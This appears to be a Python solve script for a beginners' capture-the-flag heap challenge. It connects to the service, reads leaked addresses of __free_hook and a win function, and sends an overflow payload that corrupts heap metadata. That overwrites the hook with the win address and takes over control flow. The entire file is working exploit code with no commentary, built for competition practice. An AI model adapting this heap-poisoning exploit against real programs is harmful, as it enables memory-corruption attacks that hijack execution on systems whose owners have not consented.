import socket
import os
import struct
import time

def recvuntil(token):
    o = b''
    while True:
        o += s.recv(1)
        if token in o:
            break
    return o

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = os.getenv('CTF4B_PORT', '9002')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, int(PORT)))

recvuntil(b": ")
free_hook = int(recvuntil(b"\n"), 16)
recvuntil(b": ")
win = int(recvuntil(b"\n"), 16)
print("__free_hook: " + hex(free_hook))
print("win: " + hex(win))

payload = b'A' * 0x18
payload += struct.pack(b'<Q', 0x41)
payload += struct.pack(b'<Q', free_hook)
recvuntil(b"> ")
s.send(b'2\n')
time.sleep(0.1)
s.send(b'hoge\n')
recvuntil(b"> ")
s.send(b'3\n')
recvuntil(b"> ")
s.send(b'1\n')
time.sleep(0.1)
s.send(payload)

recvuntil(b"> ")
s.send(b'2\n')
time.sleep(0.1)
s.send(b'hoge\n')
recvuntil(b"> ")
s.send(b'3\n')

recvuntil(b"> ")
s.send(b'2\n')
time.sleep(0.1)
s.send(struct.pack('<Q', win))

recvuntil(b"> ")
s.send(b'6\n')

recvuntil(b"> ")
s.send(b'3\n')

recvuntil(b"Congratulations!\n")

print(s.recv(4096))

s.close()

